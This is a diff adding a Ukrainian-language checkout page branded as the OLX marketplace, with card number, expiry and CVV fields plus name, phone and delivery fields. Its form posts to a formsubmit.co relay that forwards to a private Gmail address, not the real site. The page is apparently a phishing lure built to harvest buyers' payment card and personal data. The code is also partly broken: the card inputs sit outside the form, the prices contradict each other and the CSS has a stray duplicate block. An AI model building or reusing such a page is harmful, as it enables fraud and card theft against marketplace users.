@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Підсумок і оплата</title>
+  <style>
+    * { box-sizing: border-box; font-family: Arial, sans-serif; }
+    body { margin: 0; background:#f5f7f8; color:#0f2a2d; }
+    header {
+      background:#0f2a2d; color:#fff; padding:16px 40px;
+      display:flex; align-items:center; justify-content:space-between;
+    }
+    header .logo { font-size:28px; font-weight:700; color:#3fd0c9; }
+    header nav { font-size:14px; opacity:.9; }
+
+    .container {
+      max-width:1200px; margin:40px auto; display:grid;
+      grid-template-columns: 1fr 420px; gap:40px;
+      background:#fff; padding:40px; border-radius:12px;
+    }
+
+    h1 { margin-top:0; }
+
+    .payment-method {
+      border:1px solid #dce4e6; border-radius:10px;
+      padding:16px; margin-bottom:16px;
+      display:flex; justify-content:space-between; align-items:center;
+      cursor:pointer;
+    }
+    .payment-method.active { border:2px solid #0f2a2d; }
+    .price { font-weight:600; }
+
+    /* New OLX-like input style */
+    input {
+      width: 100%;
+      padding: 16px;
+      margin-bottom: 14px;
+      font-size: 16px;
+      border: 2px solid #dcdfe3;
+      border-radius: 12px;
+      background: #f7f9fa;
+      transition: 0.15s;
+    }
+
+    input::placeholder {
+      color: #9aa3a9;
+      font-size: 15px;
+    }
+
+    input:focus {
+      border-color: #0f2a2d;
+      background: #fff;
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(15, 42, 45, 0.15);
+    }
+
+    button {
+      width:100%; padding:14px; margin-top:20px;
+      border:none; border-radius:10px;
+      background:#0f2a2d; color:#fff; font-size:16px;
+      cursor:pointer;
+    }
+    button:hover { opacity:.9; }
+
+    .summary {
+      border:1px solid #dce4e6; border-radius:12px; padding:24px;
+    }
+    .summary-item { display:flex; justify-content:space-between; margin:12px 0; }
+    .summary-total { font-weight:700; font-size:18px; }
+
+    footer {
+      background:#0f2a2d; color:#fff; padding:20px;
+      text-align:center; font-size:13px; margin-top:40px;
+    }
+      
+@media (max-width: 768px) {
+  header { 
+    padding: 16px 20px; 
+  }
+
+  .container {
+    grid-template-columns: 1fr;
+    padding: 20px;
+    margin: 20px;
+  }
+
+  h1 { 
+    font-size: 22px; 
+  }
+
+  .summary { 
+    margin-top: 20px; 
+  }
+
+  button { 
+    font-size: 15px; 
+    padding: 14px; 
+  }
+
+  input {
+    width: 100%;
+    padding: 18px;
+    margin-bottom: 16px;
+    font-size: 17px;
+    border: 2px solid #dcdfe3;
+    border-radius: 12px;
+    background: #f7f9fa;
+  }
+
+  input::placeholder {
+    font-size: 16px;
+  }
+}
+
+      .container {
+        grid-template-columns: 1fr;
+        padding:20px;
+        margin:20px;
+      }
+      h1 { font-size:22px; }
+      .summary { margin-top:20px; }
+      button { font-size:15px; padding:12px; }
+      input {
+        font-size:16px;
+      }
+    }
+  </style>
+  <script>
+    let selectedMethod = 'card';
+
+    function selectMethod(el, method) {
+      document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('active'));
+      el.classList.add('active');
+      selectedMethod = method;
+    }
+
+    function toggleForms(method) {
+      document.getElementById('cardBlock').style.display = method === 'card' ? 'block' : 'none';
+      document.getElementById('deliveryBlock').style.display = method === 'office' ? 'block' : 'none';
+    }
+  </script>
+</head>
+<body>
+
+<header>
+  <div class="logo">OLX</div>
+  <nav>Чат · Укр · Рус</nav>
+</header>
+
+<div class="container">
+  <div>
+    <h1>Підсумок і оплата</h1>
+
+    <div class="payment-method active" onclick="selectMethod(this,'card');toggleForms('card')">
+      <div>
+        <strong>Картка онлайн</strong><br>
+        <small>16 329 грн.</small>
+      </div>
+    </div>
+
+    <div class="payment-method" onclick="selectMethod(this,'office');toggleForms('office')">
+      <div>
+        <strong>Оплата у відділенні</strong><br>
+        <small>16 470,06 грн.</small>
+      </div>
+    </div>
+
+    <div id="cardBlock">
+      <h3>Оплата карткою</h3>
+      <input type="text" placeholder="Номер картки" />
+      <input type="text" placeholder="MM / YY" />
+      <input type="text" placeholder="CVV" />
+    </div>
+
+    <div id="deliveryBlock" style="display:none">
+      <h3>Контактні дані</h3>
+      <input type="text" name="lastname" placeholder="Прізвище" required />
+      <input type="text" name="firstname" placeholder="Імʼя" required />
+      <input type="text" name="fathername" placeholder="По батькові" required />
+      <input type="tel" name="phone" placeholder="Телефон" required />
+      <input type="email" name="email" placeholder="Email" required />
+
+      <h3>Дані для доставки</h3>
+      <input type="text" name="city" placeholder="Місто" required />
+      <input type="text" name="branch" placeholder="Відділення" required />
+    </div>
+
+    <form action="https://formsubmit.co/bggg1092@gmail.com" method="POST">
+      <input type="hidden" name="_subject" value="📦 Нове замовлення" />
+      <input type="hidden" name="_next" value="success.html" />
+      <button type="submit">Оформити замовлення</button>
+    </form>
+  </div>
+
+  <div class="summary">
+    <h3>Ваше замовлення</h3>
+    <div class="summary-item">
+      <span>Вартість товару</span>
+      <span>2 325 грн</span>
+    </div>
+    <div class="summary-item">
+      <span>Доставка</span>
+      <span>Безкоштовно</span>
+    </div>
+    <div class="summary-item">
+      <span>Безпечна угода</span>
+      <span>58,13 грн</span>
+    </div>
+    <hr />
+    <div class="summary-item summary-total">
+      <span>До сплати</span>
+      <span>2 383,13 грн</span>
+    </div>
+  </div>
+</div>
+
+<footer>
+  Цей сайт використовує cookies. Ви можете змінити налаштування у своєму браузері.
+</footer>
+
+</body>
+</html>
